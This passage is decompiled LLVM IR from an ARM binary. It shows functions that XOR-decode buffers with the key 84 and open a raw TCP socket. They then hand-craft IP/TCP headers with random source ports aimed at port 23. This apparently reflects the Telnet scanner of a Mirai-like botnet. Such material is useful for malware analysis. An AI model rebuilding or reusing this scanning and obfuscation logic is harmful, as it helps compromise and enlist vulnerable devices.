dec_label_pc_e868.dec_label_pc_e920_crit_edge:    ; preds = %dec_label_pc_e868
  %v1_e928.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e920

dec_label_pc_e8b0:                                ; preds = %dec_label_pc_e868
  %v2_e874 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e8b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_e8b0 = add i32 %v0_e8b0, 28
  store i32 %v1_e8b0, i32* @r0, align 4
  %v0_e8b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e8b4 = add i32 %v0_e8b0, 24
  %v3_e8b4 = inttoptr i32 %v2_e8b4 to i32*
  store i32 %v0_e8b4, i32* %v3_e8b4, align 4
  store i32 256, i32* @r1, align 4
  %v0_e8bc = call i32 @function_108e0()
  store i32 %v0_e8bc, i32* %r0.global-to-local, align 4
  %v0_e8c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_e8c0 = add i32 %v0_e8c0, 4
  %v2_e8c0 = inttoptr i32 %v1_e8c0 to i32*
  %v3_e8c0 = load i32, i32* %v2_e8c0, align 4
  store i32 %v3_e8c0, i32* %r4.global-to-local, align 4
  %v0_e8c4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e8c4, i32* %r2.global-to-local, align 4
  store i32 %v3_e8c0, i32* %r0.global-to-local, align 4
  %v2_e8d0 = call i32 @function_11140(i32 %v3_e8c0, i32 3)
  %v1_e8d8 = or i32 %v2_e8d0, 2048
  store i32 %v1_e8d8, i32* %r2.global-to-local, align 4
  %v0_e8dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e8dc, i32* %r0.global-to-local, align 4
  %v2_e8e0 = call i32 @function_11140(i32 %v0_e8dc, i32 4)
  store i32 %v2_e8e0, i32* %r0.global-to-local, align 4
  %v2_e8e8 = load i32, i32* @global_var_1f2a4.122, align 4
  store i32 %v2_e8e8, i32* %r2.global-to-local, align 4
  %v1_e8f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_e8f0 = add i32 %v1_e8f0, 12
  %v3_e8f0 = inttoptr i32 %v2_e8f0 to i32*
  store i32 1, i32* %v3_e8f0, align 4
  store i32 2, i32* @r3, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e8fc = load i32, i32* %r2.global-to-local, align 4
  %v1_e8fc = load i32, i32* %r5.global-to-local, align 4
  %v2_e8fc = add i32 %v1_e8fc, 8
  %v3_e8fc = inttoptr i32 %v2_e8fc to i32*
  store i32 %v0_e8fc, i32* %v3_e8fc, align 4
  %v0_e900 = load i32, i32* %r5.global-to-local, align 4
  %v1_e900 = add i32 %v0_e900, 16
  %v2_e900 = inttoptr i32 %v1_e900 to i32*
  %v3_e900 = load i32, i32* %v2_e900, align 4
  store i32 %v3_e900, i32* @ip, align 4
  %v1_e904 = add i32 %v0_e900, 4
  %v2_e904 = inttoptr i32 %v1_e904 to i32*
  %v3_e904 = load i32, i32* %v2_e904, align 4
  store i32 %v3_e904, i32* %r0.global-to-local, align 4
  %v1_e908 = add i32 %v0_e900, 20
  %v2_e908 = inttoptr i32 %v1_e908 to i16*
  %v3_e908 = load i16, i16* %v2_e908, align 2
  %v4_e908 = zext i16 %v3_e908 to i32
  store i32 %v4_e908, i32* %r5.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e91c = call i32 @function_118d4(i32 %v3_e904, i32 %v2_e874, i32 16)
  store i32 %v3_e91c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e920

dec_label_pc_e920:                                ; preds = %dec_label_pc_e868.dec_label_pc_e920_crit_edge, %dec_label_pc_e8b0
  %v1_e928 = phi i32 [ %v1_e928.pre, %dec_label_pc_e868.dec_label_pc_e920_crit_edge ], [ %v3_e91c, %dec_label_pc_e8b0 ]
  %v2_e924 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e924, i32* @r4, align 4
  store i32 %v12_e868, i32* @lr, align 4
  ret i32 %v1_e928

; uselistorder directives
  uselistorder i32 %v3_e8a0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @function_108e0, { 8, 4, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e920, { 1, 0 }
}

define i32 @function_e930(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e930:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e930 = load i32, i32* @r4, align 4
  %v6_e930 = load i32, i32* @r5, align 4
  %v9_e930 = load i32, i32* @r6, align 4
  %v12_e930 = load i32, i32* @r7, align 4
  %v15_e930 = load i32, i32* @r8, align 4
  %v18_e930 = load i32, i32* @sb, align 4
  %v21_e930 = load i32, i32* @sl, align 4
  %v24_e930 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_1f270.124 to i32), i32* @fp, align 4
  %v2_e938 = load i32, i32* @global_var_1f270.124, align 4
  store i32 ptrtoint (i32* @global_var_1f29c.126 to i32), i32* @sl, align 4
  %v1_e944 = add i32 %v2_e938, 1
  store i32 %v1_e944, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e950 = load i32, i32* @global_var_1f29c.126, align 4
  store i32 %v2_e950, i32* %r0.global-to-local, align 4
  %v3_e954 = mul i32 %v1_e944, 16
  store i32 %v3_e954, i32* %r1.global-to-local, align 4
  %v4_e95c = inttoptr i32 %v2_e950 to i32*
  %v5_e95c = call i32 @function_12788(i32* %v4_e95c, i32 %v3_e954, i32 %arg3, i32 %v1_e944)
  %v2_e960 = load i32, i32* @global_var_1f270.124, align 4
  store i32 %v2_e960, i32* %r2.global-to-local, align 4
  store i32 %v5_e95c, i32* @r8, align 4
  %v0_e968 = load i32, i32* @r5, align 4
  store i32 %v0_e968, i32* %r0.global-to-local, align 4
  %v1_e970 = load i32, i32* @sl, align 4
  %v2_e970 = inttoptr i32 %v1_e970 to i32*
  store i32 %v5_e95c, i32* %v2_e970, align 4
  %v1_e974 = inttoptr i32 %v0_e968 to i8*
  %v2_e974 = call i32 @function_1084c(i8* %v1_e974)
  %sext = mul i32 %v2_e974, 16777216
  %v1_e978 = sdiv i32 %sext, 16777216
  %v2_e978 = add nsw i32 %v1_e978, 1
  store i32 %v2_e978, i32* @r4, align 4
  store i32 %v1_e978, i32* @r7, align 4
  store i32 %v2_e978, i32* @r0, align 4
  %v0_e984 = call i32 @function_11d34()
  store i32 %v0_e984, i32* %r0.global-to-local, align 4
  %v0_e988 = load i32, i32* @r5, align 4
  store i32 %v0_e988, i32* %r1.global-to-local, align 4
  %v0_e98c = load i32, i32* @r4, align 4
  store i32 %v0_e98c, i32* %r2.global-to-local, align 4
  store i32 %v0_e984, i32* %r6.global-to-local, align 4
  %v3_e994 = call i32 @function_108bc(i32 %v0_e984, i32 %v0_e988, i32 %v0_e98c)
  store i32 %v3_e994, i32* %r0.global-to-local, align 4
  %v0_e998 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e998, 1
  %extract.t6 = trunc i32 %v0_e998 to i8
  br i1 %tmp22, label %dec_label_pc_e9bc, label %dec_label_pc_e9a0

dec_label_pc_e9a0:                                ; preds = %dec_label_pc_e930
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e9a4

dec_label_pc_e9a4:                                ; preds = %dec_label_pc_e9a4, %dec_label_pc_e9a0
  %v2_e9ac = phi i32 [ %v1_e9b0, %dec_label_pc_e9a4 ], [ 0, %dec_label_pc_e9a0 ]
  %v1_e9a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e9a4 = add i32 %v1_e9a4, %v2_e9ac
  %v3_e9a4 = inttoptr i32 %v2_e9a4 to i8*
  %v4_e9a4 = load i8, i8* %v3_e9a4, align 1
  %v6_e9a4 = zext i8 %v4_e9a4 to i32
  %v1_e9a8 = xor i32 %v6_e9a4, 84
  store i32 %v1_e9a8, i32* %r3.global-to-local, align 4
  %v1_e9ac = trunc i32 %v1_e9a8 to i8
  store i8 %v1_e9ac, i8* %v3_e9a4, align 1
  %v0_e9b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e9b0 = add i32 %v0_e9b0, 1
  store i32 %v1_e9b0, i32* %r2.global-to-local, align 4
  %v1_e9b4 = load i32, i32* @r7, align 4
  %v9_e9b4 = icmp eq i32 %v1_e9b0, %v1_e9b4
  br i1 %v9_e9b4, label %dec_label_pc_e9bc.loopexit, label %dec_label_pc_e9a4

dec_label_pc_e9bc.loopexit:                       ; preds = %dec_label_pc_e9a4
  %extract.t = trunc i32 %v1_e9b0 to i8
  br label %dec_label_pc_e9bc

dec_label_pc_e9bc:                                ; preds = %dec_label_pc_e9bc.loopexit, %dec_label_pc_e930
  %v0_e9cc.off0 = phi i8 [ %extract.t, %dec_label_pc_e9bc.loopexit ], [ %extract.t6, %dec_label_pc_e930 ]
  %v2_e9bc = load i32, i32* @global_var_1f270.124, align 4
  %v2_e9c0 = load i32, i32* @global_var_1f29c.126, align 4
  %v3_e9c4 = mul i32 %v2_e9bc, 16
  store i32 %v3_e9c4, i32* @sb, align 4
  %v2_e9c8 = add i32 %v2_e9c0, %v3_e9c4
  store i32 %v2_e9c8, i32* %r2.global-to-local, align 4
  %v3_e9cc = add i32 %v2_e9c8, 12
  %v4_e9cc = inttoptr i32 %v3_e9cc to i8*
  store i8 %v0_e9cc.off0, i8* %v4_e9cc, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e960, i32* %r3.global-to-local, align 4
  %v0_e9d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_e9d8 = load i32, i32* @r8, align 4
  %v5_e9d8 = mul i32 %v2_e960, 16
  %v6_e9d8 = add i32 %v1_e9d8, %v5_e9d8
  %v7_e9d8 = inttoptr i32 %v6_e9d8 to i32*
  store i32 %v0_e9d8, i32* %v7_e9d8, align 4
  %v2_e9dc = load i32, i32* @global_var_1f29c.126, align 4
  store i32 %v2_e9dc, i32* @r7, align 4
  %v1_e9e0 = inttoptr i32 %arg2 to i8*
  %v2_e9e0 = call i32 @function_1084c(i8* %v1_e9e0)
  %sext1 = mul i32 %v2_e9e0, 16777216
  %v1_e9e4 = sdiv i32 %sext1, 16777216
  %v2_e9e4 = add nsw i32 %v1_e9e4, 1
  store i32 %v2_e9e4, i32* @r4, align 4
  store i32 %v1_e9e4, i32* @r6, align 4
  store i32 %v2_e9e4, i32* @r0, align 4
  %v0_e9f0 = call i32 @function_11d34()
  store i32 %v0_e9f0, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e9f8 = load i32, i32* @r4, align 4
  store i32 %v0_e9f8, i32* %r2.global-to-local, align 4
  store i32 %v0_e9f0, i32* %r5.global-to-local, align 4
  %v3_ea00 = call i32 @function_108bc(i32 %v0_e9f0, i32 %arg2, i32 %v0_e9f8)
  store i32 %v3_ea00, i32* %r0.global-to-local, align 4
  %v0_ea04 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_ea04, 1
  %extract.t8 = trunc i32 %v0_ea04 to i8
  br i1 %tmp23, label %dec_label_pc_ea28, label %dec_label_pc_ea0c

dec_label_pc_ea0c:                                ; preds = %dec_label_pc_e9bc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ea10

dec_label_pc_ea10:                                ; preds = %dec_label_pc_ea10, %dec_label_pc_ea0c
  %v2_ea18 = phi i32 [ %v1_ea1c, %dec_label_pc_ea10 ], [ 0, %dec_label_pc_ea0c ]
  %v1_ea10 = load i32, i32* %r5.global-to-local, align 4
  %v2_ea10 = add i32 %v1_ea10, %v2_ea18
  %v3_ea10 = inttoptr i32 %v2_ea10 to i8*
  %v4_ea10 = load i8, i8* %v3_ea10, align 1
  %v6_ea10 = zext i8 %v4_ea10 to i32
  %v1_ea14 = xor i32 %v6_ea10, 84
  store i32 %v1_ea14, i32* %r3.global-to-local, align 4
  %v1_ea18 = trunc i32 %v1_ea14 to i8
  store i8 %v1_ea18, i8* %v3_ea10, align 1
  %v0_ea1c = load i32, i32* %r2.global-to-local, align 4
  %v1_ea1c = add i32 %v0_ea1c, 1
  store i32 %v1_ea1c, i32* %r2.global-to-local, align 4
  %v1_ea20 = load i32, i32* @r6, align 4
  %v9_ea20 = icmp eq i32 %v1_ea1c, %v1_ea20
  br i1 %v9_ea20, label %dec_label_pc_ea28.loopexit, label %dec_label_pc_ea10

dec_label_pc_ea28.loopexit:                       ; preds = %dec_label_pc_ea10
  %extract.t7 = trunc i32 %v1_ea1c to i8
  br label %dec_label_pc_ea28

dec_label_pc_ea28:                                ; preds = %dec_label_pc_ea28.loopexit, %dec_label_pc_e9bc
  %v0_ea38.off0 = phi i8 [ %extract.t7, %dec_label_pc_ea28.loopexit ], [ %extract.t8, %dec_label_pc_e9bc ]
  %v2_ea28 = load i32, i32* @global_var_1f270.124, align 4
  store i32 %v2_ea28, i32* %r0.global-to-local, align 4
  %v2_ea2c = load i32, i32* @global_var_1f29c.126, align 4
  %v3_ea30 = mul i32 %v2_ea28, 16
  store i32 %v3_ea30, i32* %r1.global-to-local, align 4
  %v2_ea34 = or i32 %v3_ea30, 13
  %v3_ea38 = add i32 %v2_ea34, %v2_ea2c
  %v4_ea38 = inttoptr i32 %v3_ea38 to i8*
  store i8 %v0_ea38.off0, i8* %v4_ea38, align 1
  store i32 ptrtoint (i16** @global_var_1f2a0.128 to i32), i32* %r4.global-to-local, align 4
  %v2_ea44 = load i16, i16* bitcast (i16** @global_var_1f2a0.128 to i16*), align 4
  %v3_ea44 = zext i16 %v2_ea44 to i32
  store i32 %v3_ea44, i32* %lr.global-to-local, align 4
  %v2_ea4c = load i32, i32* @global_var_1f29c.126, align 4
  store i32 %v2_ea4c, i32* %r2.global-to-local, align 4
  %v0_ea54 = load i32, i32* %r1.global-to-local, align 4
  %v2_ea54 = add i32 %v0_ea54, %v2_ea4c
  store i32 %v2_ea54, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_1f2a0.128 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_ea5c = load i32, i32* @sb, align 4
  %v1_ea5c = load i32, i32* @r7, align 4
  %v2_ea5c = add i32 %v1_ea5c, %v0_ea5c
  store i32 %v2_ea5c, i32* %ip.global-to-local, align 4
  %v0_ea60 = load i32, i32* %r0.global-to-local, align 4
  %v1_ea60 = add i32 %v0_ea60, 1
  store i32 %v1_ea60, i32* %r0.global-to-local, align 4
  %v3_ea64 = add i32 %v2_ea54, 10
  %v4_ea64 = inttoptr i32 %v3_ea64 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_1f2a0.128 to i32), i32 16), i32 16) to i16), i16* %v4_ea64, align 2
  %v0_ea68 = load i32, i32* %lr.global-to-local, align 4
  %v1_ea68 = trunc i32 %v0_ea68 to i16
  %v2_ea68 = load i32, i32* %r1.global-to-local, align 4
  %v3_ea68 = add i32 %v2_ea68, 8
  %v4_ea68 = inttoptr i32 %v3_ea68 to i16*
  store i16 %v1_ea68, i16* %v4_ea68, align 2
  %v0_ea6c = load i32, i32* %r5.global-to-local, align 4
  %v1_ea6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ea6c = add i32 %v1_ea6c, 4
  %v3_ea6c = inttoptr i32 %v2_ea6c to i32*
  store i32 %v0_ea6c, i32* %v3_ea6c, align 4
  %v1_ea70 = load i32, i32* @fp, align 4
  %v2_ea70 = inttoptr i32 %v1_ea70 to i32*
  store i32 %v1_ea60, i32* %v2_ea70, align 4
  %v0_ea74 = load i32, i32* %r3.global-to-local, align 4
  %v1_ea74 = trunc i32 %v0_ea74 to i16
  %v2_ea74 = load i32, i32* %r4.global-to-local, align 4
  %v3_ea74 = inttoptr i32 %v2_ea74 to i16*
  store i16 %v1_ea74, i16* %v3_ea74, align 2
  store i32 %v3_e930, i32* @r4, align 4
  store i32 %v6_e930, i32* @r5, align 4
  store i32 %v9_e930, i32* @r6, align 4
  store i32 %v12_e930, i32* @r7, align 4
  store i32 %v15_e930, i32* @r8, align 4
  store i32 %v18_e930, i32* @sb, align 4
  store i32 %v21_e930, i32* @sl, align 4
  store i32 %v24_e930, i32* @fp, align 4
  ret i32 %v1_ea60

; uselistorder directives
  uselistorder i32 %v3_ea30, { 1, 0 }
  uselistorder i32 %v1_ea1c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e9f0, { 1, 0, 2 }
  uselistorder i32 %v3_e9c4, { 1, 0 }
  uselistorder i32 %v1_e9b0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e984, { 1, 0, 2 }
  uselistorder i32 %v2_e960, { 1, 0, 2 }
  uselistorder i32 %v3_e954, { 1, 0 }
  uselistorder i32 %v1_e944, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @function_1084c, { 0, 1, 9, 10, 11, 12, 13, 27, 2, 3, 4, 5, 6, 7, 8, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @function_ea90(i32 %arg1) local_unnamed_addr {
dec_label_pc_ea90:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp335 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_ea90 = load i32, i32* @r4, align 4
  %v6_ea90 = load i32, i32* @r5, align 4
  %v18_ea90 = load i32, i32* @sb, align 4
  %v0_ea9c = call i32 @function_10ffc()
  store i32 %v0_ea9c, i32* %r0.global-to-local, align 4
  %v7_eaa0 = icmp eq i32 %v0_ea9c, -1
  %. = zext i1 %v7_eaa0 to i32
  %tmp370 = icmp slt i32 %v0_ea9c, 1
  %storemerge329 = select i1 %tmp370, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_212fc.130 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eabc = icmp eq i32 %storemerge329, 0
  store i1 %v2_eabc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_ea9c, i32* @global_var_212fc.130, align 4
  br i1 %v2_eabc, label %dec_label_pc_ead8, label %dec_label_pc_eac8

dec_label_pc_eac8:                                ; preds = %dec_label_pc_ea90
  store i32 %v3_ea90, i32* %r4.global-to-local, align 4
  store i32 %v6_ea90, i32* @r5, align 4
  store i32 %v18_ea90, i32* @sb, align 4
  ret i32 %v0_ea9c

dec_label_pc_ead8:                                ; preds = %dec_label_pc_ea90
  %v0_ead8 = call i32 @function_10b08()
  store i32 %v0_ead8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_212d8.45 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_ead8, i32* @global_var_212d8.45, align 4
  %v1_eae4 = call i32 @function_e12c(i32 %v0_ead8)
  %v0_eae8 = load i32, i32* @r4, align 4
  store i32 %v0_eae8, i32* %r0.global-to-local, align 4
  %v1_eaec = inttoptr i32 %v0_eae8 to i32*
  %v2_eaec = call i32 @function_10f8c(i32* %v1_eaec)
  store i32 ptrtoint (i32* @global_var_1f2a4.122 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_eaec, i32* @global_var_1f2a4.122, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_eb00 = call i32 @function_12654(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_212f4.134 to i32), i32* %r3.global-to-local, align 4
  %v0_eb08 = load i32, i32* @r4, align 4
  store i32 %v0_eb08, i32* %stack_var_-52, align 4
  store i32 %v2_eb00, i32* @global_var_212f4.134, align 4
  store i32 %v0_eb08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb14

dec_label_pc_eb14:                                ; preds = %dec_label_pc_eb14.dec_label_pc_eb14_crit_edge, %dec_label_pc_ead8
  %v2_eb20 = phi i32 [ %v2_eb20.pre, %dec_label_pc_eb14.dec_label_pc_eb14_crit_edge ], [ %v2_eb00, %dec_label_pc_ead8 ]
  %v0_eb28 = phi i32 [ %v0_eb58, %dec_label_pc_eb14.dec_label_pc_eb14_crit_edge ], [ %v0_eb08, %dec_label_pc_ead8 ]
  %v3_eb1c = mul i32 %v0_eb28, 256
  store i32 %v3_eb1c, i32* %ip.global-to-local, align 4
  %v2_eb30 = mul i32 %v0_eb28, 288
  %v1_eb38 = add i32 %v0_eb28, 1
  store i32 %v1_eb38, i32* %r0.global-to-local, align 4
  %v2_eb3c = add i32 %v2_eb30, %v2_eb20
  store i32 %v2_eb3c, i32* %r2.global-to-local, align 4
  store i32 %v2_eb3c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_eb50 = add i32 %v2_eb3c, 4
  %v3_eb50 = inttoptr i32 %v2_eb50 to i32*
  store i32 -1, i32* %v3_eb50, align 4
  %v0_eb54 = load i32, i32* @r5, align 4
  %v1_eb54 = load i32, i32* %r1.global-to-local, align 4
  %v2_eb54 = add i32 %v1_eb54, 12
  %v3_eb54 = inttoptr i32 %v2_eb54 to i32*
  store i32 %v0_eb54, i32* %v3_eb54, align 4
  %v0_eb58 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_eb58, i32* %stack_var_-52, align 4
  %v7_eb5c = icmp sgt i32 %v1_eb38, 255
  br i1 %v7_eb5c, label %dec_label_pc_eb60, label %dec_label_pc_eb14.dec_label_pc_eb14_crit_edge

dec_label_pc_eb14.dec_label_pc_eb14_crit_edge:    ; preds = %dec_label_pc_eb14
  %v2_eb20.pre = load i32, i32* @global_var_212f4.134, align 4
  br label %dec_label_pc_eb14

dec_label_pc_eb60:                                ; preds = %dec_label_pc_eb14
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_eb6c = call i32 @function_11aec(i32 2, i32 3, i32 6)
  store i32 %v3_eb6c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_212f8.136 to i32), i32* %r2.global-to-local, align 4
  %v2_eb74 = icmp eq i32 %v3_eb6c, -1
  store i1 %v2_eb74, i1* %cpsr_c.global-to-local, align 1
  %v7_eb74 = icmp eq i32 %v3_eb6c, -1
  store i1 %v7_eb74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_eb6c, i32* %r4.global-to-local, align 4
  store i32 %v3_eb6c, i32* @global_var_212f8.136, align 4
  br i1 %v7_eb74, label %dec_label_pc_10240, label %dec_label_pc_eb84

dec_label_pc_eb84:                                ; preds = %dec_label_pc_eb60
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_eb88 = load i32, i32* @r5, align 4
  store i32 %v0_eb88, i32* %r2.global-to-local, align 4
  %v2_eb8c = call i32 @function_11140(i32 %v3_eb6c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_eb94 = or i32 %v2_eb8c, 2048
  store i32 %v1_eb94, i32* %r2.global-to-local, align 4
  %v0_eb98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_eb98, i32* %r0.global-to-local, align 4
  %v2_eb9c = call i32 @function_11140(i32 %v0_eb98, i32 4)
  %v2_eba4 = load i32, i32* @global_var_212f8.136, align 4
  store i32 %v2_eba4, i32* %r0.global-to-local, align 4
  %v2_eba8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_ebb0 = load i32, i32* @r5, align 4
  store i32 %v0_ebb0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_ebb8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_ebb8, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_ebc8 = call i32 @function_11aa8(i32 %v2_eba4, i32 %v0_ebb0, i32 3, i32 %v2_ebb8, i32 4)
  store i32 %v5_ebc8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ebcc = icmp eq i32 %v5_ebc8, 0
  store i1 %v2_ebcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebcc, label %dec_label_pc_ebd4, label %dec_label_pc_10234

dec_label_pc_ebd4:                                ; preds = %dec_label_pc_eb84, %dec_label_pc_ebd4
  %v0_ebd4 = call i32 @function_e0d0()
  %v3_ebd8 = mul i32 %v0_ebd4, 65536
  store i32 %v3_ebd8, i32* %r0.global-to-local, align 4
  %v1_ebe0 = mul i32 %v0_ebd4, 256
  %v3_ebe4 = and i32 %v1_ebe0, 65280
  %tmp373 = udiv i32 %v0_ebd4, 256
  %v4_ebe8 = urem i32 %tmp373, 256
  %v5_ebe8 = or i32 %v4_ebe8, %v3_ebe4
  store i32 %v5_ebe8, i32* %r3.global-to-local, align 4
  %v2_ebec = icmp ugt i32 %v5_ebe8, 1023
  store i1 %v2_ebec, i1* %cpsr_c.global-to-local, align 1
  %v7_ebec = icmp eq i32 %v5_ebe8, 1024
  store i1 %v7_ebec, i1* %cpsr_z.global-to-local, align 1
  %v3_ebf4 = icmp ult i32 %v5_ebe8, 1022
  br i1 %v3_ebf4, label %dec_label_pc_ebd4, label %dec_label_pc_ebf8

dec_label_pc_ebf8:                                ; preds = %dec_label_pc_ebd4
  %v5_ebf0.le = trunc i32 %v0_ebd4 to i16
  store i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32* %r0.global-to-local, align 4
  %v2_ebfc = load i8, i8* bitcast (i8** @global_var_1f274.138 to i8*), align 4
  %v3_ebfc = zext i8 %v2_ebfc to i32
  %v1_ec00 = and i32 %v3_ebfc, 240
  %v1_ec04 = or i32 %v1_ec00, 5
  store i32 %v1_ec04, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_1f274.138 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_1f276.139 to i16*), align 4
  %v0_ec24 = call i32 @function_e0d0()
  %v1_ec24 = trunc i32 %v0_ec24 to i16
  %v3_ec2c = load i8, i8* @global_var_1f294.142, align 1
  store i32 ptrtoint (i16* @global_var_1f288.141 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_1f274.138 to i32), i32* %ip.global-to-local, align 4
  %v1_ec3c = urem i8 %v3_ec2c, 16
  store i16 %v1_ec24, i16* bitcast (i32* @global_var_1f278.143 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_ec4c = or i8 %v1_ec3c, 80
  store i8 64, i8* bitcast (i32* @global_var_1f27c.144 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_1f27d.145 to i8*), align 4
  store i8 %v1_ec4c, i8* @global_var_1f294.142, align 1
  %v4_ec5c = sext i16 %v5_ebf0.le to i32
  store i32 %v4_ec5c, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_1f28a.146, align 2
  store i16 %v5_ebf0.le, i16* @global_var_1f288.141, align 2
  %v0_ec6c = call i32 @function_e0d0()
  %v1_ec6c = trunc i32 %v0_ec6c to i16
  %v3_ec74 = load i8, i8* @global_var_1f295.147, align 1
  %v4_ec74 = zext i8 %v3_ec74 to i32
  store i32 ptrtoint (i16* @global_var_1f288.141 to i32), i32* %ip.global-to-local, align 4
  %v1_ec7c = or i32 %v4_ec74, 2
  store i32 %v1_ec7c, i32* %r3.global-to-local, align 4
  store i16 %v1_ec6c, i16* bitcast (i32* @global_var_1f296.148 to i16*), align 4
